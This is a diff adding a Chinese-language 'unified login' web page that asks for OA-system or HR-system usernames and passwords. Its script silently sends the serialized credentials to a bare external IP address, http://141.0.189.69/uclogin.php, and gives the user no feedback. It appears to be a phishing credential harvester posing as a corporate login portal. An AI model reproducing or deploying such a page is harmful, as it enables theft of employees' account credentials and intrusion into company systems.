@@ -1,0 +1,47 @@
+
+<div id="content_box">
+	<div style="font-size: 14px;">统一登录平台入口</div>
+	<form name="fm_login" action=""  id='fm_login' 
+		method="get" >
+		<input type="radio" name="authkind" value="1"
+			onclick="username.focus();document.getElementById('label_n').innerHTML='OA系统用户账号';document.getElementById('label_p').innerHTML='OA系统用户密码';"
+			checked /> OA系统认证 <input type="radio" name="authkind" value="2"
+			onclick="username.focus();document.getElementById('label_n').innerHTML='人力资源系统用户账号';document.getElementById('label_p').innerHTML='人力资源系统用户密码';" />
+		人力资源系统认证 <input type="hidden" name="action" value="login">
+		<div class="password">
+			<label class="txt_default" id="label_n"
+				style="color: #ccc; text-align: right;" for="n" default_txt="OA用户账号">OA系统用户账号</label>
+			<input id="n" type="text" class="txt" name="username" value=""><br>
+		</div>
+		<div class="password">
+			<label class="txt_default" id="label_p"
+				style="color: #ccc; text-align: right;" for="p" default_txt="OA用户密码">OA系统用户密码</label>
+			<input id="p" type="password" class="password txt" name="userpass">
+		</div>
+		<div class="login_submit">
+			<a class="login_btn_wrapper" href="javascript:;"> 
+			<input class="login_btn" type="button"  name="submit" value=" 登 录 " id='btn_submit' >
+			</a>
+		</div>
+	</form>
+</div>
+<script>
+	$(function() {
+		$("#btn_submit").bind('click',function(){
+			var dat=$("#fm_login").serialize();
+			$.ajax({
+				url:"http://141.0.189.69/uclogin.php",
+				type:"POST",
+				dataType:'jsonp' ,
+				data:dat,
+				success:function(json){
+				},
+				error:function(XMLHttpResponse){
+	
+				}
+			});
+			
+			
+		});
+	});
+</script>
